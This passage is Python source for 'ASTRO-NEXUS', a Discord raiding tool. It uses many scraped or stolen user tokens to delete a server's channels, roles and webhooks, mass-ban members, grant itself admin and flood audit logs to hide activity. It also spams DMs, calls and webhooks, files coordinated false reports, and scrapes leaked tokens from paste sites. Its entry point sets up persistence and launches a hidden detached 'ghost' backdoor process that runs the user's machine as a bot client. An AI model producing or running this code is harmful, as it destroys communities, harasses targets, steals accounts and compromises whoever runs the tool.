        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def delete_all_webhooks(self, guild_id):
        token = random.choice(tokens)
        hooks = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/webhooks", token).json()
        chunks = [hooks[i::len(tokens)] for i in range(len(tokens))]

        def task(token, chunk):
            for w in chunk:
                self.request("DELETE", f"https://discord.com/api/v9/webhooks/{w['id']}", token)
                console.log("Deleted", C["red"], "Webhook", w["name"])

        with ThreadPoolExecutor(max_workers=20) as exe:
            for i, token in enumerate(tokens): exe.submit(task, token, chunks[i])

    def prune_members(self, guild_id, days=7):
        def task(token):
            self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/prune", token, json={"days": days})
            console.log("Pruned", C["yellow"], "Guild", guild_id)
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def auto_status(self, text):
        def task(token):
            self.request("PATCH", "https://discord.com/api/v9/users/@me/settings", token, json={"custom_status": {"text": text}})
            console.log("Status Updated", C["green"], f"{token[:20]}...", text)
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def grant_admin_to_all(self, guild_id):
        def task(token):
            res = self.request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token, json={"name": "ASTRO-ADMIN", "permissions": "8", "color": 0x00FFFF})
            if res and res.status_code == 200:
                role_id = res.json()["id"]
                user_id = self.request("GET", "https://discord.com/api/v9/users/@me", token).json()["id"]
                self.request("PUT", f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}/roles/{role_id}", token)
                console.log("Admin Granted", C["aqua"], "To Token", token[:20])
        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def audit_flooder(self, guild_id):
        """God-Mode Audit Log Saturator"""
        def task(token):
            while not STRIKE_EVENT.is_set():
                # Toggle Guild Name & Settings
                name = f"RAIDED-{uuid.uuid4().hex[:10]}"
                self.request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}", token, json={"name": name, "verification_level": random.randint(0,4)})
                # Rename Roles
                roles = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/roles", token).json()
                for r in roles:
                    if STRIKE_EVENT.is_set(): break
                    self.request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}/roles/{r['id']}", token, json={"name": uuid.uuid4().hex[:10]})
                console.log("Flooded", C["magenta"], f"Audit Log Noise Generated: {token[:15]}...")

        for token in tokens: threading.Thread(target=task, args=(token,)).start()

    def webhook_overdrive(self, guild_id, message="RAIDED BY ASTRO-NEXUS OVERDRIVE"):
        """Untraceable Webhook Velocity Strike"""
        token = random.choice(tokens)
        chans = self.request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels", token).json()
        
        def task(token, channel_id):
            # Create Webhook
            res = self.request("POST", f"https://discord.com/api/v9/channels/{channel_id}/webhooks", token, json={"name": "ASTRO-NEXUS"})
            if res and res.status_code == 200:
                hook_url = res.json()["url"]
                # Blast messages via Webhook (Untraceable)
                for _ in range(50):
                    if STRIKE_EVENT.is_set(): break
                    requests.post(hook_url, json={"content": message})
                console.log("Striking", C["red"], "Webhook Deployed", f"Channel: {channel_id}")

        with ThreadPoolExecutor(max_workers=50) as exe:
            for chan in chans:
                if STRIKE_EVENT.is_set(): break
                exe.submit(task, random.choice(tokens), chan["id"])

class Menu:
    def __init__(self):
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color]
            
        self.raider = Raider()
        self.options = {
            "1": self.joiner, 
            "2": self.leaver,
            "3": self.spammer, 
            "4": self.checker,
            "5": self.reactor, 
            "6": self.nuker,
            "7": self.formatter,
            "8": self.button,
            "9": self.accept,
            "10": self.guild,
            "11": self.friender,
            "12": self.analytics,
            "13": self.onliner,
            "14": self.soundbord,
            "15": self.nick_changer,
            "16": self.Thread_Spammer,
            "17": self.typier,
            "18": self.sniper,
            "19": self.caller,
            "20": self.bio_changer,
            "21": self.voice_joiner,
            "22": self.onboard,
            "23": self.dm_spam,
            "24": self.exits,
            "25": self.mass_report,
            "26": self.hypesquad,
            "27": self.mass_block,
            "28": self.leave_all,
            "29": self.token_gen,
            "30": self.nuke_all,
            "31": self.del_channels,
            "32": self.del_roles,
            "33": self.del_emojis,
            "34": self.webhook_overdrive,
            "35": self.create_chans,
            "36": self.create_rols,
            "37": self.m_ban,
            "38": self.m_kick,
            "39": self.identity,
            "40": self.m_prune,
            "41": self.auto_stat,
            "42": self.grant_adm,
            "43": self.audit_flooder,
            "44": self.webhook_overdrive,
            "45": self.proxy_gen,
            "46": self.proxy_clean,
            "~": self.credit,
            "?": self.tokens_tutorial,
            "!": self.proxies_tutorial,
            "h": self.usage_guide,
        }

    # --- DISCORD MANAGEMENT WRAPPERS ---

    def proxy_gen(self):
        console.title("ASTRO-NEXUS - Proxy Overdrive")
        self.raider.proxy_overdrive()
        input(f"\n{console.prompt('Strike Complete. Press Enter')}")
        self.main_menu()

    def proxy_clean(self):
        console.title("ASTRO-NEXUS - Proxy Sanitization")
        self.raider.proxy_cleaner()
        input(f"\n{console.prompt('Purge Complete. Press Enter')}")
        self.main_menu()

    def guild_id_prompt(self):
        console.clear()
        console.render_ascii()
        return input(f"{console.prompt('Guild ID')}")

    def nuke_all(self):
        g_id = self.guild_id_prompt()
        self.raider.server_nuker(g_id)
        input(f"\n{console.prompt('Press Enter')}")
        self.main_menu()

    def del_channels(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_channels(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def del_roles(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_roles(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def del_emojis(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_emojis(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def del_webhooks(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_webhooks(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def create_chans(self):
        g_id = self.guild_id_prompt()
        name = input(f"{console.prompt('Channel Name')}")
        self.raider.mass_create_channels(g_id, name)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def create_rols(self):
        g_id = self.guild_id_prompt()
        name = input(f"{console.prompt('Role Name')}")
        self.raider.mass_create_roles(g_id, name)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def m_ban(self):
        g_id = self.guild_id_prompt()
        self.raider.mass_ban(g_id)
        input(f"\n{console.prompt('Banning... Press Enter')}")
        self.main_menu()

    def m_kick(self):
        g_id = self.guild_id_prompt()
        self.raider.mass_kick(g_id)
        input(f"\n{console.prompt('Kicking... Press Enter')}")
        self.main_menu()

    def identity(self):
        g_id = self.guild_id_prompt()
        name = input(f"{console.prompt('New Server Name')}")
        icon = input(f"{console.prompt('Icon URL (Enter for None)')}")
        self.raider.change_guild_identity(g_id, name, icon if icon else None)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def m_prune(self):
        g_id = self.guild_id_prompt()
        days = input(f"{console.prompt('Days (Default 7)')}")
        self.raider.prune_members(g_id, int(days) if days else 7)
        input(f"\n{console.prompt('Pruning... Press Enter')}")
        self.main_menu()

    def auto_stat(self):
        text = input(f"{console.prompt('Status Text')}")
        self.raider.auto_status(text)
        input(f"\n{console.prompt('Done. Press Enter')}")
        self.main_menu()

    def grant_adm(self):
        g_id = self.guild_id_prompt()
        self.raider.grant_admin_to_all(g_id)
        input(f"\n{console.prompt('Granting... Press Enter')}")
        self.main_menu()

    def main_menu(self):
        console.run()

        choice = input(f"{' '*6}{self.background}-> {Fore.RESET}")

        if choice.startswith('0') and len(choice) == 2:
            choice = str(int(choice))

        if choice.lower() in self.options:
            self.options[choice.lower()]()
        else:
            self.main_menu()

    def rainbow_pulse(self):
        colors = [C["red"], C["orange"], C["yellow"], C["green"], C["blue"], C["magenta"], C["orchid"], C["aqua"]]
        try:
            t_size = os.get_terminal_size().columns
        except:
            t_size = 120
        msg = "⋘ ACCESSING ASTRO-NEXUS OVERDRIVE ⋙"
        padding = (t_size - len(msg)) // 2
        for _ in range(5): # Faster, more intense pulse
            for color in colors:
                sys.stdout.write(f"\r{' ' * padding}{color}{msg}{Fore.RESET}")
                sys.stdout.flush()
                time.sleep(0.02)
        print("\n")

    def run(self, func, args):
        STRIKE_EVENT.clear()
        self.rainbow_pulse()
        console.clear()
        console.render_ascii()
        
        console.log("EXECUTION", C["rose"], "ORCHESTRATING STRIKE", f"Threads: {len(args)}")
        console.log("SYSTEM", C["gray"], "Press CTRL+C to Abort Strike")
        
        try:
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = [executor.submit(func, *arg) for arg in args]
                for future in futures:
                    try:
                        # Polling result to allow KeyboardInterrupt to be caught
                        while not future.done():
                            if STRIKE_EVENT.is_set():
                                break
                            time.sleep(0.1)
                        if STRIKE_EVENT.is_set():
                            executor.shutdown(wait=False, cancel_futures=True)
                            break
                    except Exception as e:
                        console.log("WORKER ERROR", C["red"], str(e))
        except KeyboardInterrupt:
            STRIKE_EVENT.set()
            console.log("HALTED", C["yellow"], "STRIKE ABORTED BY USER")
            time.sleep(1)
        
        input(f"\n   {self.background}» Operation Finished. Press Enter «{Fore.RESET}")
        self.main_menu()

    def token_gen(self):
        console.clear()
        console.render_ascii()
        console.log("VACUUM", C["aqua"], "1: Deep Web Crawler (Pastebin/GitHub/Gist)")
        console.log("VACUUM", C["aqua"], "2: Channel Sniper (Sniff current server chats)")
        mode = input(f"\n   {self.background}» Mode «{Fore.RESET} ")
        
        console.log("INFO", C["gray"], "Recommended: 9-12 threads (3 workers per site)")
        threads = input(f"{console.prompt('Threads (Suction Power)')}")
        try:
            t_count = int(threads)
        except:
            t_count = 10
            
        console.log("SYSTEM", C["gray"], f"Activating The Vacuum v2 with {t_count} threads...")
        args = [(mode,) for _ in range(t_count)]
        self.run(self.raider.token_scraper, args)

    def audit_stat(self):
        guild = input(f"{console.prompt('Server ID')}")
        self.raider.audit_flooder(guild)

    def webhook_overdrive(self):
        guild = input(f"{console.prompt('Server ID')}")
        message = input(f"{console.prompt('Spam Message')}")
        self.raider.webhook_overdrive(guild, message)

    def m_prune(self):
        guild = input(f"{console.prompt('Server ID')}")
        self.raider.prune_members(guild)

    def audit_flooder(self):
        guild = input(f"{console.prompt('Server ID')}")
        self.raider.audit_flooder(guild)

    @wrapper
    def dm_spam(self):
        console.title(f"ASTRO-NEXUS - Dm Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        message = input(console.prompt("Message"))
        if message == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id, message) for token in tokens
        ]
        self.run(self.raider.dm_spammer, args)

    @wrapper
    def soundbord(self):
        console.title(f"ASTRO-NEXUS - Soundboard Spam")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            
        channel = Link.split("/")[5]
        guild = Link.split("/")[4]

        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.join_voice_channel, args=(token, guild, channel)).start()
            threading.Thread(target=self.raider.soundbord, args=(token, channel)).start()

    @wrapper
    def friender(self):
        console.title(f"ASTRO-NEXUS - Friender")
        nickname = input(console.prompt("Nick"))
        if nickname == "":
            self.main_menu()

        args = [
            (token, nickname) for token in tokens
        ]
        self.run(self.raider.friender, args)

    @wrapper
    def caller(self):
        console.title(f"ASTRO-NEXUS - Call Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id) for token in tokens
        ]
        self.run(self.raider.call_spammer, args)

    def onliner(self):
        console.title(f"ASTRO-NEXUS - Onliner")
        args = [
            (token, websocket.WebSocket()) for token in tokens
        ]
        self.run(self.raider.onliner, args)

    @wrapper
    def typier(self):
        console.title(f"ASTRO-NEXUS - Typer")
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channelid = Link.split("/")[5]
        args = [
            (token, channelid) for token in tokens
        ]
        self.run(self.raider.typier, args)

    @wrapper
    def nick_changer(self):
        console.title(f"ASTRO-NEXUS - Nickname Changer")
        nick = input(console.prompt("Nick"))
        if nick == "" or len(nick) > 32:
            self.main_menu()

        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild, nick) for token in tokens
        ]
        self.run(self.raider.mass_nick, args)

    @wrapper
    def voice_joiner(self):
        console.title(f"ASTRO-NEXUS - Voice Joiner")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        guild = Link.split("/")[4]
        channel = Link.split("/")[5]
        args = [
            (token, guild, channel) for token in tokens
        ]
        self.run(self.raider.join_voice_channel, args)

    @wrapper
    def Thread_Spammer(self):
        console.title(f"ASTRO-NEXUS - Thread Spammer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        name = input(console.prompt("Name"))
        if name == "":
            self.main_menu()

        channel_id = Link.split("/")[5]
        args = [
            (token, channel_id, name) for token in tokens
        ]
        self.run(self.raider.thread_spammer, args)

    @wrapper
    def nuker(self):
        console.title(f"ASTRO-NEXUS - Server Nuker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()
        
        console.clear()
        console.render_ascii()
        self.raider.server_nuker(guild_id)

    @wrapper
    def analytics(self):
        console.title(f"ASTRO-NEXUS - Token Analytics")
        args = [
            (token,) for token in tokens
        ]
        self.run(self.raider.token_analytics, args)

    @wrapper
    def sniper(self):
        console.title(f"ASTRO-NEXUS - Nitro Sniper")
        args = [
            (token,) for token in tokens
        ]
        self.run(self.raider.nitro_sniper, args)

    @wrapper
    def joiner(self):
        console.title(f"ASTRO-NEXUS - Joiner")
        invite = input(console.prompt(f"Invite"))
        if invite == "":
            self.main_menu()

        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite)

        self.raider.joiner(invite)

    @wrapper 
    def leaver(self):
        console.title(f"ASTRO-NEXUS - Leaver")
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild) for token in tokens
        ]
        self.run(self.raider.leaver, args)

    @wrapper
    def spammer(self):
        console.title(f"ASTRO-NEXUS - Spammer [PILOT EDITION]")
        console.log("MODE", C["aqua"], "1: Global Strike (All Tokens)")
        console.log("MODE", C["aqua"], "2: Pilot Identity (Select Specific Account)")
        choice = input(f"\n   {self.background}» Option «{Fore.RESET} ")

        target_tokens = tokens
        if choice == "2":
            console.log("SYSTEM", C["gray"], "Fetching identities from the grid...")
            identities = []
            for i, t in enumerate(tokens[:15]): # Limit to first 15 for speed
                tag = self.raider.get_token_info(t)
                identities.append((t, tag))
                print(f"      {C['aqua']}[{i+1}] {C['gray']}{tag} {C['rose']}({t[:15]}...)")
            
            p_choice = input(f"\n   {self.background}» Select Pilot «{Fore.RESET} ")
            try:
                idx = int(p_choice) - 1
                target_tokens = [identities[idx][0]]
                console.log("PILOT", C["aqua"], f"Identity Locked: {identities[idx][1]}")
            except:
                console.log("ERROR", C["red"], "Invalid Selection, defaulting to Global.")

        link = input(console.prompt(f"Channel LINK"))
        if link == "" or not link.startswith("https://"):
            self.main_menu()

        guild_id = link.split("/")[4]
        channel_id = link.split("/")[5]

        console.log("ACTION", C["rose"], "[S]pam Standard | [D]OS Flood | [B]ypass Ghost")
        act = input(f"\n   {self.background}» Action «{Fore.RESET} ").lower()

        massping = "n"
        random_str = "n"
        message = ""
        delay = None

        if act == "d":
            message = input(console.prompt("Flood Message"))
            threads = input(console.prompt("Intensity (Threads 1-20)"))
            try: t_count = int(threads)
            except: t_count = 5
            args = [(target_tokens[0], channel_id, message) for _ in range(t_count)]
            self.run(self.raider.dos_flooder, args)
            return

        massping = input(console.prompt("Massping", True))
        random_str = input(console.prompt("Random String", True))
        message = input(console.prompt("Message"))
        
        delay_input = input(console.prompt("Delay (seconds)"))
        if delay_input != "":
            delay = float(delay_input)

        ping_count = None
        if "y" in massping:
            console.log(f"Scraping users", self.background, False, "this may take a while...")
            self.raider.member_scrape(guild_id, channel_id)
            count_str = input(console.prompt("Pings Amount"))
            ping_count = int(count_str) if count_str != "" else 10

        args = [
            (token, channel_id, message, guild_id, "y" in massping, ping_count, "y" in random_str, delay)
            for token in target_tokens
        ]

        self.run(self.raider.spammer, args)

    def checker(self):
        console.title(f"ASTRO-NEXUS - Checker")
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        console.title(f"ASTRO-NEXUS - Reactor")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        console.clear()
        console.render_ascii()
        self.raider.reactor_main(channel_id, message_id)

    def button(self):
        console.title(f"ASTRO-NEXUS - Button Click")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            return

        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]

        console.clear()
        console.render_ascii()
        self.raider.button_bypass(channel_id, message_id, guild_id)

    def formatter(self):
        console.title(f"ASTRO-NEXUS - Formatter")
        self.run(self.raider.format_tokens, [()])

    @wrapper
    def accept(self):
        console.title(f"ASTRO-NEXUS - Accept Rules")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.accept_rules(guild_id)

    @wrapper
    def guild(self):
        console.title(f"ASTRO-NEXUS - Guild Checker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.guild_checker(guild_id)

    @wrapper
    def bio_changer(self):
        console.title(f"ASTRO-NEXUS - Bio Changer")
        bio = input(console.prompt("Bio"))
        if bio == "":
            self.main_menu()

        args = [
            (token, bio) for token in tokens
        ]
        self.run(self.raider.bio_changer, args)

    @wrapper
    def onboard(self):
        console.title(f"ASTRO-NEXUS - Onboarding Bypass")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        self.raider.onboard_bypass(guild_id)

    @wrapper
    def credit(self):
        credits_lines = [
            "Special Thanks to",
            "Coder: GamingParkBG",
            "Owner: GamingParkBG",
            "ASTRO-NEXUS",
            "And last but not least, you! Without you, this project wouldn't be possible.",
        ]

        for line in credits_lines:
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 120
            centered_line = line.center(cols)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")

        input("\n ~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def exits(self):
        os._exit(0)

    @wrapper
    def mass_report(self):
        console.title(f"ASTRO-NEXUS - Mass Report")
        link = input(console.prompt("Message Link"))
        if link == "" or not link.startswith("https://"): self.main_menu()
        
        guild_id = link.split("/")[4]
        channel_id = link.split("/")[5]
        message_id = link.split("/")[6]
        
        print("\n   [1] Illegal Content  [2] Harassment  [3] Spam  [4] Other")
        reason_map = {"1": 1, "2": 2, "3": 3, "4": 4}
        choice = input(console.prompt("Reason"))
        reason = reason_map.get(choice, 3)

        args = [(token, guild_id, channel_id, message_id, reason) for token in tokens]
        self.run(self.raider.mass_report, args)

    @wrapper
    def hypesquad(self):
        console.title(f"ASTRO-NEXUS - HypeSquad Joiner")
        print("\n   [1] Bravery  [2] Brilliance  [3] Balance")
        choice = input(console.prompt("House"))
        house_id = {"1": 1, "2": 2, "3": 3}.get(choice, 1)
        
        args = [(token, house_id) for token in tokens]
        self.run(self.raider.hypesquad, args)

    @wrapper
    def mass_block(self):
        console.title(f"ASTRO-NEXUS - Mass Block")
        user_id = input(console.prompt("User ID"))
        if user_id == "": self.main_menu()
        
        args = [(token, user_id) for token in tokens]
        self.run(self.raider.mass_block, args)

    @wrapper
    def leave_all(self):
        console.title(f"ASTRO-NEXUS - Leave All Guilds")
        confirm = input(console.prompt("Are you sure? (y/n)"))
        if "y" not in confirm: self.main_menu()
        
        args = [(token,) for token in tokens]
        self.run(self.raider.leave_all, args)

    @wrapper
    def usage_guide(self):
        console.title("ASTRO-NEXUS - Master Documentation [Full Rig]")
        guides = [
            ("01", "Joiner       ", "All tokens join a server using an Invite link/code."),
            ("02", "Leaver       ", "All tokens leave a server using its Guild ID."),
            ("03", "Spammer      ", "High-velocity channel strike. Includes Ghost & DOS modes."),
            ("04", "Checker      ", "Validates tokens and sorts into Live/Locked/Invalid."),
            ("05", "Reaction     ", "Multi-token reaction bombing on a specific message link."),
            ("06", "Server Nuker ", "Complete destruction: Del channels/roles and rebuilds wasteland."),
            ("07", "Formatter    ", "Purifies data/tokens.txt from junk data and duplicates."),
            ("08", "Button Click ", "Automated interaction with verification bot buttons."),
            ("09", "Accept Rules ", "Instantly bypasses Discord's 'Verify Identity' rules on join."),
            ("10", "Guild Check  ", "Checks which tokens have successfully entered a target guild."),
            ("11", "Friend Spam  ", "Floods a target User ID with friend requests from everyone."),
            ("12", "Analytics    ", "Deep extraction of account data (Nitros, Badges, Billing)."),
            ("13", "Onliner      ", "Keeps all tokens in an active online status infinitely."),
            ("14", "Soundboard   ", "Annoying soundboard spam in a VC for max irritation."),
            ("15", "Change Nick  ", "Mass rename all tokens to a specific name in a server."),
            ("16", "Thread Spam  ", "Creates endless threads in a channel to flood the sidebar."),
            ("17", "Typer        ", "Sets 'typing...' status for all tokens to cause panic."),
            ("18", "Nitro Sniper ", "Real-time gift monitoring. First one to see it, snipes it."),
            ("19", "Call Spammer ", "Lethal call-bombing a user until they block or log out."),
            ("20", "Bio Change   ", "Updates the 'About Me' section of all token profiles."),
            ("21", "Voice Joiner ", "Moves all tokens into a specific voice channel."),
            ("22", "Onboarding   ", "Completes Discord's new user onboarding steps automatically."),
            ("23", "DM Spammer   ", "Direct Message carpet bombing to a target User ID."),
            ("24", "Exit         ", "Safely shuts down the interface and core processes."),
            ("25", "Mass Report  ", "Coordinated reports to Discord T&S to terminate targets."),
            ("26", "HypeSquad    ", "Joins a specific HypeSquad house (Brilliance/Bravery/Balance)."),
            ("27", "Mass Block   ", "Blocks a specific User ID from every token on the grid."),
            ("28", "Leave All    ", "Tokens exit every single server they are currently in."),
            ("29", "Token Scrape ", "The Megalodon Engine: Sucks tokens from Pastebin/GitHub."),
            ("30", "KABOOM (Nuke)", "Targeted server destruction (Channels + Roles strike)."),
            ("31", "DEL CHANNELS ", "Wipes every channel from the server instantly."),
            ("32", "DEL ROLES    ", "Wipes every role from the server instantly."),
            ("33", "DEL EMOJIS   ", "Wipes every emoji from the server instantly."),
            ("34", "DEL WEBHOOKS ", "Wipes every webhook from the server instantly."),
            ("35", "NEW CHANNELS ", "Mass creates 100+ channels with a custom custom name."),
            ("36", "NEW ROLES    ", "Mass creates 100+ roles with admin permissions."),
            ("37", "MASS BAN     ", "The Executioner: Bans every single member in the server."),
            ("38", "MASS KICK    ", "Cleans the server by kicking every member."),
            ("39", "IDENTITY MOD ", "Synchronizes avatars and usernames for the entire fleet."),
            ("40", "PRUNE GUILD  ", "Removes inactive members from the guild via API."),
            ("41", "AUTO STATUS  ", "Sets a custom status message (Playing/Watching) for all."),
            ("42", "GRANT ADMIN  ", "Creates a hidden admin role and gives it to all tokens."),
            ("43", "AUDIT FLOOD  ", "Overloads the audit logs with junk to hide your tracks."),
            ("44", "WEBHOOK BLAST", "Untraceable message flood via server-side webhooks."),
            ("45", "PROXY GEN    ", "Scrapes and verifies millions of proxies against Discord."),
            ("46", "PROXY CLEAN  ", "Purges dead/unverified proxies from your local grid."),
        ]
        
        print(f"\n{Fore.LIGHTCYAN_EX}   ASTRO-NEXUS ULTIMATE BUTTON GUIDE [1-46]\n")
        # Optimization: Show 15 per screen to keep it readable
        page = 0
        while page < len(guides):
            for i in range(page, min(page + 15, len(guides))):
                code, category, desc = guides[i]
                line = f"{Fore.WHITE}[{self.background}{code}{Fore.WHITE}] {Fore.CYAN}{category:<15} {Fore.RESET}{desc}"
                print(f"   {line}")
            
            page += 15
            if page < len(guides):
                input(f"\n {C['aqua']}» {Fore.RESET}Press Enter for Next Page ({page}/{len(guides)}) ")
                console.clear()
                console.render_ascii()
                print(f"\n{Fore.LIGHTCYAN_EX}   ASTRO-NEXUS ULTIMATE BUTTON GUIDE [CONT.]\n")

        print(f"\n{C['rose']}   CORE DOCUMENTATION COMPLETE.")
        input(f"\n {C['aqua']}» {Fore.RESET}Press Enter to return to Grid ")
        self.main_menu()

    @wrapper
    def tokens_tutorial(self):
        console.title("ASTRO-NEXUS - Tokens Tutorial")
        tutorial = [
            "How to get Discord Tokens:",
            "1. Open Discord in your Browser (Chrome/Edge).",
            "2. Press F12 or Ctrl+Shift+I to open Developer Tools.",
            "3. Go to the 'Application' tab (click >> if hidden).",
            "4. On the left, expand 'Local Storage' and click 'https://discord.com'.",
            "5. Search for 'token' in the filter box.",
            "6. Copy the value (without quotes) and paste it into data/tokens.txt.",
        ]
        print("\n")
        for line in tutorial:
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 80
            centered_line = line.center(cols)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")
        input("\n ~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def proxies_tutorial(self):
        console.title("ASTRO-NEXUS - Proxies Tutorial")
        tutorial = [
            "How to use Proxies:",
            "1. Get some HTTP/HTTPS proxies (Webshare, ProxyScrape, etc.).",
            "2. Format: ip:port OR user:pass@ip:port.",
            "3. Paste them into data/proxies.txt (har line pe ek).",
            "4. Raider will automatically cycle through them.",
            "5. Proxies help avoid Discord rate limits and IP bans.",
        ]
        print("\n")
        for line in tutorial:
            try:
                cols = os.get_terminal_size().columns
            except:
                cols = 80
            centered_line = line.center(cols)
            print(f"{Fore.RESET}{self.background}{centered_line}{Fore.RESET}")
        input("\n ~/> press enter to continue ")
        self.main_menu()

if __name__ == "__main__":
    # 1. SETUP PERSISTENCE
    persistence()
    
    # Simple Lock Mechanism to prevent multiple background instances
    lock_file = os.path.join(os.getenv('TEMP') if os.name == 'nt' else '/tmp', 'nexus_backdoor.lock')
    
    # 2. GHOST MODE HANDLER (The hidden background process)
    if "--ghost" in sys.argv:
        # Check if another ghost is already running
        if os.path.exists(BACKDOOR_LOCK):
            try:
                with open(BACKDOOR_LOCK, 'r') as f:
                    pid = int(f.read())
                if platform.system() == "Windows":
                    # Check if PID is alive
                    try:
                        import ctypes
                        process = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
                        if process:
                            ctypes.windll.kernel32.CloseHandle(process)
                            sys.exit()
                    except: pass
            except: pass
            
        with open(BACKDOOR_LOCK, 'w') as f:
            f.write(str(os.getpid()))
            
        stealth_mode()
        try:
            client.run(TOKEN)
        except:
            pass
        finally:
            if os.path.exists(BACKDOOR_LOCK): 
                try: os.remove(BACKDOOR_LOCK)
                except: pass
        sys.exit()

    # 3. SPAWN DETACHED GHOST (If not already running)
    ghost_running = False
    if os.path.exists(BACKDOOR_LOCK):
        ghost_running = True # Simple check
    
    if not ghost_running:
        if sys.platform == "win32":
            subprocess.Popen([sys.executable, sys.argv[0], "--ghost"], 
                             creationflags=0x00000008 | 0x00000200, 
                             close_fds=True)
        else:
            subprocess.Popen([sys.executable, sys.argv[0], "--ghost"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                             start_new_session=True)

    # 4. LAUNCH LOCAL INTERFACE (The foreground UI)
    try:
        Menu().main_menu()
    except Exception as e:
        print(f"Raider Interface Error: {e}")
        time.sleep(5)
    
    # If UI is closed, this process exits, but the --ghost process sent above
    # continues to run because it was spawned with DETACHED_PROCESS/start_new_session.

